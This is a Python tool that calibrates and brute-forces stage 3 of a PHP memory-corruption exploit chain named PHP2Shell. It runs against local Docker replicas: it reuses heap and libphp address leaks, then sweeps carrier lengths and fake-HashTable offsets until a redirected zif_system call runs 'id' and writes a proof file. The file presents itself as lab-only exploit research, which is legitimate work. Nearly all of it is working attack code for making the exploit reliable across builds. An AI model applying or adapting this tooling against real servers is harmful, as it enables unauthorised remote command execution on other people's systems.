#!/usr/bin/env python3
"""Stage-3 carrier-length / HTDATA sweep for PHP2Shell.

The published chain has two build-specific heap constants:

  R0      -- the dangling ``zend_reference`` for ``$_SESSION`` that the
             carrier must overwrite
  HTDATA  -- the address of the surviving 167-byte string that carries the
             fake HashTable (``chunk + HTDATA_OFFSET``)

Both shift with the Zend MM bin layout of each PHP branch.  Upstream ships
three 8.4.x HTDATA offsets and fixes the carrier length at 15 bytes; the
carrier length selects the allocation size class, and therefore *which* free
chunk the carrier is handed -- so it is the other half of the calibration.

This tool re-derives stages 1-2 for the target build and then sweeps the
(carrier length x HTDATA offset) product space, checking for real command
execution (a proof file written by the container) after every attempt.

Local disposable containers only.
"""
from __future__ import annotations

import argparse
import json
import os
import re
import sys
import time

LAB = os.path.dirname(os.path.abspath(__file__))
DEV = os.path.join(LAB, "devploit-php2shell")
VENDOR = os.path.join(DEV, "vendor", "php2shell-upstream")
sys.path.insert(0, os.path.join(DEV, "tools"))

import php2shell_calibrate as C  # noqa: E402
import php2shell_matrix as M  # noqa: E402


def start(image: str, port: int, name: str) -> tuple[str, str]:
    M.docker("rm", "-f", name)
    outdir = M.prepare_lab_out(os.path.join(M.LAB, "out", name))
    M.docker(
        "run", "-d", "--name", name,
        "-p", f"127.0.0.1:{port}:80",
        "-v", f"{M.LAB}/webroot:/var/www/html:ro",
        "-v", f"{M.LAB}/php.ini:/usr/local/etc/php/conf.d/zz-matrix.ini:ro",
        "-v", f"{M.LAB}/apache.conf:/etc/apache2/conf-enabled/zz-matrix.conf:ro",
        "-v", f"{outdir}:/out",
        image, timeout=900,
    )
    url = f"http://127.0.0.1:{port}/index.php"
    if not M.wait_http(url):
        raise SystemExit("replica did not answer")
    return url, outdir


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--image", required=True)
    ap.add_argument("--port", type=int, required=True)
    ap.add_argument("--name", required=True)
    ap.add_argument("--htdatas", default="0x690d8",
                    help="comma separated HTDATA offsets from the chunk base")
    ap.add_argument("--carrier-lens", default="15",
                    help="comma separated carrier lengths to try")
    ap.add_argument("--pads", default="bookworm",
                    help="'bookworm' (carrier) or 'lab' (raw 55B reference)")
    ap.add_argument("--pad-shapes", default=None,
                    help="comma separated nl:vl pairs; when given, the pad "
                         "shape is swept alongside the carrier length "
                         "(e.g. '31:31,24:24,16:16' -> [(nl,vl)]*6)")
    ap.add_argument("--extra-cookies", default=None,
                    help="comma separated 0/1 values for the priming request's "
                         "extra PHPSESSID Cookie header (P2S_EXTRA_COOKIE)")
    ap.add_argument("--span", type=int, default=0,
                    help="+/- window swept around each HTDATA base")
    ap.add_argument("--step", type=int, default=8)
    ap.add_argument("--hints", default=None,
                    help="build profile JSON with calibrated stage1/stage2 hints")
    ap.add_argument("--out", default=None)
    args = ap.parse_args()

    hints = {}
    if args.hints:
        with open(args.hints, encoding="utf-8") as fh:
            prof = json.load(fh)
        st = prof.get("stages", {})
        hints = {
            "stage1_n": st.get("stage1_n"),
            "stage1_len": st.get("stage1_forge_len"),
            "stage1_val_len": 48,
            "stage2_t": st.get("stage2_t"),
            "stage2_v": st.get("stage2_v", 16),
        }
        print("[*] hints from %s: %s" % (args.hints, hints))

    url, outdir = start(args.image, args.port, args.name)
    proof = os.path.join(outdir, "p1")

    if hints:
        # offsets.py writes the shared vendor out/offsets.env, which races any
        # concurrent run; the profile already records this build's symbols.
        sym = {"zif_system": int(prof["libphp"]["zif_system"], 0),
               "zval_ptr_dtor": int(prof["libphp"]["zval_ptr_dtor"], 0)}
        print("[*] symbols from profile: zif=%s dtor=%s"
              % (hex(sym["zif_system"]), hex(sym["zval_ptr_dtor"])))
    else:
        sym = C.extract_symbols(VENDOR, args.name)
    mod = C.load_upstream(VENDOR)
    t = mod.Target(url, verbose=False)
    ex = mod.Exploit(t, "id>/out/p1", zif_offset=sym["zif_system"],
                     dtor_offset=sym["zval_ptr_dtor"], profile="bookworm", verbose=False)

    print(f"[*] {args.image} zif={hex(sym['zif_system'])} dtor={hex(sym['zval_ptr_dtor'])}")
    # Stage leaks are timing-dependent; the hint path is one request each, so
    # try it first and fall back to the generic sweeps.
    chunk, n, flen = C.calibrate_stage1(mod, ex, hints if hints else {})
    if not chunk and hints:
        print("[!] hinted stage-1 missed; retrying generic")
        chunk, n, flen = C.calibrate_stage1(mod, ex, {})
    if not chunk:
        print("[!] stage-1 leak failed; nothing to sweep")
        M.docker("rm", "-f", args.name)
        return 2
    lib, tidx = C.calibrate_stage2(mod, ex, sym["zval_ptr_dtor"],
                                   hints if hints else {})
    if not lib and hints:
        print("[!] hinted stage-2 missed; retrying generic")
        lib, tidx = C.calibrate_stage2(mod, ex, sym["zval_ptr_dtor"], {})
    if not lib:
        print("[!] stage-2 leak failed; nothing to sweep")
        M.docker("rm", "-f", args.name)
        return 2
    print(f"[*] chunk={hex(chunk)} libphp={hex(lib)}")

    bases = [int(b, 0) for b in args.htdatas.split(",") if b]
    clens = [int(c) for c in args.carrier_lens.split(",") if c]
    use_carrier = args.pads != "lab"
    shapes = []
    if args.pad_shapes:
        for pair in args.pad_shapes.split(","):
            nl, _, vl = pair.partition(":")
            if not vl:
                vl = nl
            shapes.append((int(nl), int(vl)))
        print("[*] sweeping pad shapes: %s" % shapes)

    tried = []
    t0 = time.time()
    shape_iter = shapes if shapes else [None]
    ecookies = [c for c in (args.extra_cookies or "").split(",") if c != ""]
    ecookie_iter = ecookies if ecookies else [None]
    for ecookie in ecookie_iter:
      if ecookie is not None:
          os.environ["P2S_EXTRA_COOKIE"] = ecookie
      for shape in shape_iter:
        for clen in clens:
            os.environ["P2S_CARRIER_LEN"] = str(clen)
            for base in bases:
                offsets = range(base - args.span, base + args.span + 1, args.step) \
                    if args.span else [base]
                for off in offsets:
                    if os.path.exists(proof):
                        os.unlink(proof)
                    ex.stage3_carrier = use_carrier
                    if shape is not None:
                        ex.stage3_pads = [shape] * 6
                    elif use_carrier:
                        ex.stage3_pads = [(31, 31)] * 6
                    else:
                        ex.stage3_pads = [(8, 7)] + [(7, 7)] * 5
                    try:
                        ex.rotate()
                        ex.stage3(chunk + off, lib + sym["zif_system"])
                        raw = getattr(ex, "last3", b"") or b""
                        if not raw:
                            sig = "empty/abort"
                        else:
                            head = raw.partition(b"\r\n\r\n")[0]
                            m = re.match(rb"HTTP/1\.[01] (\d{3})", head)
                            sig = "%s/%d" % (m.group(1).decode() if m else "?",
                                             len(raw))
                    except Exception as exc:
                        sig = f"exc:{type(exc).__name__}: {exc}"
                    tag = f"cookie={ecookie} pads={shape} " if (shape or ecookie) else ""
                    print(f"    {tag}clen={clen} off={hex(off)} -> {sig}",
                          flush=True)
                    if os.path.exists(proof) and os.path.getsize(proof) > 0:
                        out = open(proof).read().strip()
                        print(f"[+] clen={clen} off={hex(off)} cookie={ecookie} "
                              f"pads={shape}: {out}")
                        rec = {"carrier_len": clen, "off": hex(off), "pads": shape,
                               "extra_cookie": ecookie, "proof": out,
                               "chunk": hex(chunk), "libphp": hex(lib)}
                        if args.out:
                            json.dump(rec, open(args.out, "w", encoding="utf-8"), indent=2)
                        M.docker("rm", "-f", args.name)
                        return 0
                    tried.append({"carrier_len": clen, "off": hex(off), "sig": sig})
                done = len(tried)
                if done % 20 == 0:
                    rate = done / max(time.time() - t0, 1)
                    print(f"    .. {done} attempts ({rate:.2f}/s)", flush=True)
    print(f"[!] no stage-3 execution found in {len(tried)} attempts")
    if args.out:
        json.dump({"tried": len(tried), "chunk": hex(chunk), "libphp": hex(lib)},
                  open(args.out, "w", encoding="utf-8"), indent=2)
    M.docker("rm", "-f", args.name)
    return 1


if __name__ == "__main__":
    sys.exit(main())
